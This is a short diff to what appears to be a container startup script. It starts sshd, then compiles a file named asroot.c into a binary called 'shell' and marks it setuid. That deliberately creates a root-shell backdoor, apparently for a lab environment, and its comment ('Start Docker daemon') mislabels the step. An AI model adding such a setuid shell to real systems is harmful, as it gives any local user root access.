@@ -5,7 +5,7 @@ set -e
 /usr/sbin/sshd -D &
 
 # Start Docker daemon
-cd /bin/rootshell && gcc asadmin.c -o shell
+cd /bin/rootshell && gcc asroot.c -o shell
 #chown ot-admin:admin /bin/rootshell/shell
 cd /bin/rootshell && chmod u+s shell
 
